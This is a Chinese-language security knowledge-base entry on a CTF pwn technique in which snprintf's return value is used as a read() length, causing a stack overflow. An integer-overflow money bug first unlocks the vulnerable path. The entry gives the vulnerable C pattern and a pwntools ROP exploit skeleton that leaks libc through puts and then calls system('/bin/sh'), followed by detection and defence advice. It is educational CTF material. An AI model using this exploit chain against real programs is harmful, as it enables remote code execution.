---
id: binary-pwn-stack-snprintf-return-length-read-overflow
title: snprintf 返回值当 read 长度：格式化截断后仍按“应写长度”读入导致栈溢出
type: scenario
domain: binary
path: binary/pwn/stack
technique: snprintf-return-length-overflow
tags:
- pwn
- stack
- snprintf
- integer-overflow
- rop
- game-logic
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V91
  verified_at: '2026-11-05T19:54:31+08:00'
  notes: 已对照原文核对：input_name 中 snprintf(s,0xA0,"%s%s",buf_,长后缀) 返回值 nbytes 直接作为 read(0,s,nbytes) 长度，buf_ 0x80 时返回值超过 s[172] 造成栈溢出；整数溢出 80*v2 刷钱→gift 置 sign=0→hidden rename/input_name；两次 ROP（0xb8 偏移、pop rdi/puts@got/puts@plt/main、二次 ret 对齐+system）与原文 exp 一致。原文无组件版本区间，未设 affected_versions；frontmatter无sources/source_url。
url: /docs/binary/pwn/stack/binary-pwn-stack-snprintf-return-length-read-overflow/
draft: false
kb_aliases:
- snprintf 返回值溢出
- 截断长度误用
- read 长度用 snprintf 返回值
- 格式化字符串栈溢出
- King pwn
---

## 一句话结论

当代码把 `snprintf(dst, size, ...)` 的返回值当作后续 `read(0, dst, n)` 的长度时，若格式化结果超过 `size`，`snprintf` 返回的是“原本会写入的长度”而不是实际截断后的长度，`read` 就会向固定大小的栈缓冲区写入超过其容量的数据，直接造成栈溢出。

## 原理

- C 标准规定：`snprintf` 在输出被截断时，返回的是“假设缓冲区足够大时本应写入的字符数”（不含结尾 NUL），不是实际写入的 `size-1`。
- 典型漏洞代码：`char s[172]; memset(s, 0, 0xA0); read(0, buf_, 0x80); nbytes = snprintf(s, 0xA0, "%s%s", buf_, long_suffix); printf("%s", s); read(0, s, (unsigned int)nbytes);`
- 若 `buf_` 长度接近 0x80，`long_suffix` 又有上百字节，`snprintf` 返回的 `nbytes` 会大于 172；随后 `read(0, s, nbytes)` 以这个偏大的长度写入 `s`，覆盖 saved RBP/RIP。
- `printf("%s", s)` 还可能把 `buf_` 之后的内容一起打印，形成信息泄露；但即使没有泄露，也可用 ROP 调用 `puts@plt(puts@got)` 泄露 libc。
- 本题还叠加了游戏逻辑整数溢出：购买药品时 `80 * v2` 以 32 位 int 计算，传入超大 `v2` 可让乘积溢出为负数，`money -= 80*v2` 反而增加金钱；金钱足够后调用 gift 分支把 `sign` 置 0，解锁隐藏的 `rename()`/`input_name()` 路径，从而到达上述溢出点。

## 触发条件

- 代码使用 `snprintf` 的返回值作为 `read`/`memcpy`/`write` 的长度；
- 格式化结果可超过目标缓冲区大小（如 `%s%s` 拼接固定长后缀）；
- 目标缓冲区位于栈上，且后续 `read` 长度未与 `sizeof(dst)` 取最小值；
- 能到达该代码路径（可能需要满足游戏/业务条件，如本题的 `sign == 0`）；
- 有可用的泄露与 ROP gadget（如 `pop rdi; ret`、`puts@plt`）。

## 利用步骤

1. 审计 `snprintf` 调用，确认返回值是否直接作为后续读/写长度；计算最坏情况下返回长度与缓冲区大小的差。
2. 触发业务条件到达漏洞函数（本题用整数溢出刷钱，调用 gift 把 `sign` 置 0，进入隐藏的 `rename()` → `input_name()`）。
3. 第一次进入 `input_name`：发送 0x80 字节填充 `buf_`，使 `snprintf` 返回长度超过 `s[172]`；随后发送 `0xb8` 填充 + `pop rdi; puts@got; puts@plt; main` 的 ROP，泄露 libc。
4. 计算 `libc_base = leaked_puts - libc.sym['puts']`，解析 `system` 与 `/bin/sh`。
5. 第二次触发漏洞：发送 `0xb8` 填充 + `ret`（对齐）+ `pop rdi; /bin/sh; system`，getshell。
6. 若第一次 ROP 后程序不返回主菜单，可改用 `main` 地址或重新走业务流程再次触发。

## PoC

漏洞代码模式：

```c
char s[172];
size_t nbytes;
memset(s, 0, 0xA0u);
read(0, buf_, 0x80u);
nbytes = snprintf(s, 0xA0u, "%s%s", buf_, long_suffix);  // 返回“应写长度”，可能 > 172
printf("%s", s);                                          // 可选泄露
read(0, s, (unsigned int)nbytes);                         // 溢出
```

利用骨架（偏移按目标二进制调整）：

```python
# 第一次：泄露 libc
io.recvuntil(b"What's your name?")
io.send(b'a' * 0x80)                 # 填满 buf_，放大 snprintf 返回值
payload  = b'a' * 0xb8
payload += p64(pop_rdi) + p64(elf.got['puts'])
payload += p64(elf.plt['puts']) + p64(elf.sym['main'])
io.sendline(payload)
leak = u64(io.recv(6).ljust(8, b'\x00'))
libc_base = leak - libc.sym['puts']

# 第二次：system("/bin/sh")
io.recvuntil(b"What's your name?")
io.send(b'a' * 0x80)
payload  = b'a' * 0xb8 + p64(ret)    # 栈对齐
payload += p64(pop_rdi) + p64(libc_base + next(libc.search(b'/bin/sh\x00')))
payload += p64(libc_base + libc.sym['system'])
io.sendline(payload)
io.interactive()
```

## 变体与关联

- 变体：`snprintf` 返回值用于 `memcpy`/`strncpy`/循环写入时同样会越界；关键都是“返回值 ≠ 实际写入长度”。
- 变体：`vsnprintf`、`asprintf`、`scprintf` 等函数有类似语义；`_snprintf` 在 MSVC 下返回 -1 的行为不同，需按平台确认。
- 变体：业务条件可用整数溢出、负数、越界索引、状态机缺陷等方式满足；本题用 `80 * v2` 的 int 溢出刷钱。
- 关联：栈溢出 ROP、ret2libc、GOT 泄露、整数溢出。
- 边界：如果代码先 `nbytes = min(nbytes, sizeof(s)-1)`，或使用 `snprintf` 的实际返回值（如 `strnlen`），则不会溢出。

## 检测与防御

- 防御：永远不要用 `snprintf` 的返回值作为写入长度；使用 `sizeof(dst)-1` 或 `min(ret, sizeof(dst)-1)`，并确保 NUL 结尾。
- 防御：对 `read`/`memcpy` 的长度做上限检查；编译时开启 `-D_FORTIFY_SOURCE=2`、栈保护与 ASan，可在开发期发现。
- 检测：静态审计 `snprintf` 返回值流向 `read/memcpy` 的代码；动态测试用超长输入观察栈破坏与崩溃。
- 检测：对业务层的整数乘法（如价格×数量）做溢出检查，避免通过负数/溢出绕过状态条件。
